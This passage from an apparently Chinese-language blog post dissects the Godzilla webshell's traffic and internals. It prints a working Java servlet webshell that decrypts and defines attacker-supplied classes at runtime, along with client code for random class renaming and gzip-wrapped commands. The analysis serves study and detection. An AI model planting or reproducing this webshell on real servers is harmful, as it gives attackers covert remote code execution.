base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据m的值判断是加密还是解密，m是true的时候变量为1，这时候表示加密模式，反之是解密模式</span>            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//用于第一次接受请求初始化payload</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance(); </span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//本地加载payload，用于动态调试</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在哥斯拉主界面，点击测试会在burp发送两次请求，然后哥斯拉会弹框出现Success，这时候再点击确定，哥斯拉会发起第三次请求，先分析这三次请求的数据包以及哥斯拉都做了什么事情。<br><img src="/2022/05/17/godzilla/1.png"></p><h3 id="第一次请求"><a href="#第一次请求" class="headerlink" title="第一次请求"></a>第一次请求</h3><p>根据上面<code>HelloServlet.java</code>源代码，可以看到哥斯拉在传输过程中使用了AES加解密，在服务端先base64解码，然后AES解密数据包：<br><img src="/2022/05/17/godzilla/2.png"><br>把burp的数据包复制之后，本地解密看看是什么内容：<br><img src="/2022/05/17/godzilla/3.png"><br>可以从图里看出来大概是个Class文件，保存到本地之后，反编译可以之后会发现这个代码和<code>payload.java</code>除了类名不同，功能代码上完全一样。哥斯拉实现的这部分代码在<code>JavaShell.class</code>里面：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">String</span> <span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classNames <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>classNames<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">final</span> <span class="token keyword">int</span> index <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> classNames<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            className <span class="token operator">=</span> classNames<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> className<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">dynamicUpdateClassName</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> protoName<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classContent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>classContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"%s ----->>>>> %s"</span><span class="token punctuation">,</span> protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        classContent <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> protoName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要功能是动态改变<code>payload.class</code>的类名，会从<code>classNames.txt</code>里面随机选取一个名字：<br><img src="/2022/05/17/godzilla/4.png"><br>这是第一个请求的发送流程，做了两件事：</p><ol><li>把哥斯拉里面的<code>payload.class</code>更新为随机的类名，然后AES加密再经过base64发送到服务端的shell</li><li>服务端的shell解码解密之后，调用<code>defineClass</code>加载到JVM，初始化payload变量</li></ol><p><img src="/2022/05/17/godzilla/5.png"></p><p>关于<code>defineClass</code>的用法，可以看官方的代码注释，负责把byte[]转换为Class：</p><blockquote><p>However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method {@link #defineClass(String, byte&gt;[], int, int) defineClass} converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using {@link Class#newInstance Class.newInstance}.</p></blockquote><h3 id="第二次请求"><a href="#第二次请求" class="headerlink" title="第二次请求"></a>第二次请求</h3><p>第二次请求，按照同样的方式解密数据包，会发现出来的是一堆乱码：<br><img src="/2022/05/17/godzilla/6.png"><br>不要慌，先保存到本地，然后重命名为gz文件，再使用gunzip解压之后查看文件，文件内容是<code>methodNametest</code><br>在哥斯拉源代码里面，可以扣出来相关实现:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReqParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> codeString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>codeString<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isAlive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>codeString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fillParameter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"evalClassName"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">,</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fillParameter</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> funcName<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//组装参数methodNametest</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">formatEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">gzipE</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//gzip压缩加密</span>    <span class="token keyword">return</span> functions<span class="token punctuation">.</span><span class="token function">gzipD</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">sendHttpResponse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//发送请求之后接收数据，然后解密解压缩</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>哥斯拉客户端的流程：先在本地组装本次请求的参数，压缩之后加密发送到服务端。</p><p>此时在打个断点做一次调试看看：<br><img src="/2022/05/17/godzilla/8.png"></p><h4 id="f-equals-arrOut"><a href="#f-equals-arrOut" class="headerlink" title="f.equals(arrOut)"></a><code>f.equals(arrOut)</code></h4><p>第一次进入到payload的equals函数，arrOut是<code>ByteArrayOutputStream</code>变量，传递给<code>this.outputStream</code>，初始化一个输出对象，用于获取payload执行结果，最终返回给客户端。<br><img src="/2022/05/17/godzilla/10.png"></p><h4 id="f-equals-data"><a href="#f-equals-data" class="headerlink" 